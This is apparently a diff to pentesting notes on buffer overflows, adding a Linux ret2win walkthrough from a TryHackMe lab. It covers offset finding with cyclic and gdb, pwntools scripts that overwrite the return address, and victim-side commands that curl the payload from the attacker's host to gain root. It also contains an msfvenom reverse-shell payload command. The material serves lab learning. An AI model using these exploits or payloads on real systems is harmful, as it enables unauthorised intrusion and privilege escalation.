@@ -127,5 +127,133 @@ Now that we have the return address to use, we just need to generate our payload
 msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
 ```
 
+## **Linux**
 
+**Examples**
+
+[obscure.md](../../../walkthroughs/tryhackme/obscure.md "mention")
+
+### **Crash Replication & Controlling EIP**
+
+**Kali**
+
+```
+cyclic 256
+```
+
+**Kali**
+
+```
+gdb ret
+```
+
+**Kali(gdb)**
+
+```
+r
+```
+
+<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+This tells us it crashes after 136 characters
+
+**Kali**
+
+```
+cyclic -l 0x6261616a
+```
+
+<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+We see the win function is located at 0x400646
+
+**Kali**
+
+```
+objdump -t ret
+```
+
+<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+
+Confirmed it crashes after 136.
+
+**Kali**
+
+```
+python -c 'print("A"* 137)' | ./ret 
+```
+
+<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+
+I wanted to confirm it would crash where we expected so I added the program into a for loop
+
+**payload.py - version 2**&#x20;
+
+```
+from pwn import *
+import subprocess
+
+for i in range(130, 140):
+	payload = b'A'*i + p64(0x400646)
+	print ("Current value: " + str(i))
+
+	f = open('/root/payload.bin', 'wb')
+	f.write(payload)
+	f.close
+	os.system("(cat payload.bin; cat) | ./ret")
+```
+
+We can see 137 did work on our local box and got us to the win function when adding it's address to the script
+
+**Kali**
+
+```
+python payload.py 
+```
+
+<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+Now to create our payload and send it to the victim
+
+**payload.py - version 2**&#x20;
+
+```
+from pwn import *
+
+payload = b'A'*136 + p64(0x400646)
+
+f = open('/root/payload.bin', 'wb')
+f.write(payload)
+f.close
+```
+
+Testing that the payload still works on our local machine.
+
+**Kali**
+
+```
+(cat payload.bin; cat) | ./ret
+```
+
+<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+python2 -m SimpleHTTPServer 82
+```
+
+We are root but only within the docker container.
+
+**Victim**
+
+```
+cd /tmp
+curl http://$KALI:82/payload.bin -o payload.bin
+(cat payload.bin; cat) | /ret
+```
+
+<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+## &#x20;<a href="#find-pages" id="find-pages"></a>
 
